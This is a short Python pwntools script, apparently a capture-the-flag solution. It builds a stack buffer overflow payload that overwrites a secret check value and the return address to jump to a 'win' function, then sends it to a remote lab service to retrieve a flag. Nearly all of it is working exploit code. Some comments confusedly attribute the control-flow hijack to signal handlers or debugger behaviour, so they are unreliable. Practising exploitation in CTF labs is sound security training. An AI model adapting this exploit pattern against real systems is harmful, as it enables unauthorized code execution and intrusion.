from pwn import *
context(os='linux', arch='amd64', log_level="debug")    

import sys
offset = 88
win_address = 0x401186 # Your confirmed address
secret = 0XC0DEAB1E


# The payload is simply the overflow string.
# The program will not interpret this as 'stop' for the strncmp.
# It will continue looping, but eventually, if a return is attempted
# (e.g., if a signal handler gets involved due to memory corruption from printf,
# or if the debugger steps over it), the return address will be used.
payload = b'A' * 72 + p32(secret) + b'A' * 12 + p64(win_address)
io = remote("sisterlab.id", 42002)
io.sendlineafter(b'> ', payload)
io.sendlineafter(b'> ', b'stop')
io.recvuntil(b'flag: ')
flag = io.recvline()
print(f'flag: {flag}')
